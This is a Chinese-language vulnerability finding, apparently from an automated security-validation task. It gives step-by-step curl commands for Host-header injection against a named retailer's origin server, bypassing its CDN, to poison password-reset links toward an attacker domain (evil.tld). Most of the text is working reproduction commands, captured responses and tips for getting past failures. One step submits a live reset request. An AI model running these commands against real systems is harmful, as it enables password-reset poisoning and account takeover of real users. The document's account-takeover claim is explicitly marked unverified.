# ShopTo 源站 /en/password_reset/：绝对 URL 由 Host 头构造 → 找回密码链接投毒前置

归类：auth-validate control（Host 头未校验 / 认证控制面校验失效 → auth-bypass）
严重度：medium
来源：task#4 shopto.net 全流程安全验证，finding_id=72（verdict=verified）

## 目标 / 入口
- 源站 IP：`3.8.196.174`（ShopTo 源站，公网直达；CloudFront 边缘会拦伪造 Host 返回 403，故必须直连源站）
- 入口：`https://3.8.196.174/en/password_reset/`，用 `-H 'Host: ...'` 控制
- 端口：443（HTTPS），curl 加 `-k`；**必须 HTTP/1.0**（`--http1.0`）

## 前置条件
- 能直连源站 3.8.196.174:443（绕过 CloudFront）
- 目标应用信任 HTTP_HOST 来构造绝对 URL

## 复现步骤（实测）

### 1) 基线：canonical 由请求 Host 决定
```bash
curl -sk --http1.0 -H 'Host: localhost' https://3.8.196.174/en/password_reset/ -o p_localhost.html
```
回显：`HTTP/1.0 200 OK`，正文含
```html
<link rel='canonical' href='https://localhost/en/password_reset/' />
```

### 2) Host 头注入：绝对 URL 被攻击者域污染
```bash
curl -sk --http1.0 -H 'Host: evil.tld' https://3.8.196.174/en/password_reset/ -o p_evil.html
```
回显：`HTTP/1.0 200 OK`，正文含
```html
<link rel='canonical' href='https://evil.tld/en/password_reset/' />
<link rel='alternate' hreflang='de-de' href='https://evil.tld/de/password_reset/' />
... fr / it / af-za / x-default 共 7 条 hreflang 全部指向 evil.tld
```

### 3) 对照：排除代理头误报（确认仅 Host 被信任）
```bash
curl -sk --http1.0 -H 'Host: localhost' -H 'X-Forwarded-Host: evil.tld' \
     https://3.8.196.174/en/password_reset/
```
回显：canonical 仍为 `https://localhost/...` → X-Forwarded-Host 不被信任。

### 4) 找回密码链路（提交重置请求的页面）同样用 Host 构造绝对 URL
```bash
curl -sk --http1.0 -X POST -H 'Host: evil.tld' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     --data 'input_email=test@example.com' \
     'https://3.8.196.174/en/password_reset/?send=TRUE'
```
回显：`HTTP/1.0 200 OK`，页面 modal `Request succesfull` / `You should receive an e-mail shortly with the further steps`，响应体同样含 evil.tld 版 canonical/hreflang。

## 判据
1. Host 从 localhost 改为 evil.tld → canonical 与全部 hreflang 绝对 URL 随之改变（反射成立，响应含完整 HTML）。
2. X-Forwarded-Host: evil.tld 无效（canonical 仍 localhost）→ 证明是应用直接信 HTTP_HOST，而非代理头造成的假象。
3. 触发路径 `/en/password_reset/?send=TRUE` 返回成功 modal，且响应体同样被污染 → 该页就是找回密码提交入口，同一 URL 构造器。

## 影响与证伪条件
- 影响判定依据：canonical 仅在 `password_reset` 流程由 Host 构造（主页 / account / search / 404 均为写死 `www.shopto.net` 或无 canonical），故该流程的 URL 构造器与「重置邮件里的链接」同源可能性高 → 密码找回链接投毒（把 reset 链接指向攻击者域）→ 账号接管前置。
- **证伪条件**：实测收到的重置邮件链接若恒为 `https://www.shopto.net/...`、与请求 Host 无关，则 ATO 前置不成立。当前因无法收取邮件，尚未证实/证伪 —— 叙事中不要把它说成已实现的 ATO。

## 失败时的常见原因
- 经 CloudFront 边缘发请求 → 伪造 Host 被 403，拿不到源站回显（需直连源站 IP）。
- 用了 HTTP/1.1 → 部分路径 empty reply（改 `--http1.0`）。
- 源站仅内网可达。
- 应用已把 canonical 固定为正式域名（不再反射 Host）→ 该类目标不存在。
